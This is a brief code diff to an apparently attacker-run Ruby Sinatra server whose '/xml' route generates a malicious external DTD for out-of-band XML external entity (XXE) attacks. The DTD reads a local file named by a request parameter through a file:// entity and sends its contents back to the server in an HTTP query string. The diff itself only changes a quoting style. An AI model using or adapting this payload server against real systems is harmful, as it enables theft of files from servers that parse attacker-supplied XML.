@@ -17,7 +17,7 @@ get "/xml" do
   return "" if params[:f].nil?
 
 <<END  
-<!ENTITY % payl SYSTEM 'file://#{params[:f]}'>
+<!ENTITY % payl SYSTEM "file://#{params[:f]}">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://#{request.host}:#{request.port}/?p=%payl;'>">
 END
 end
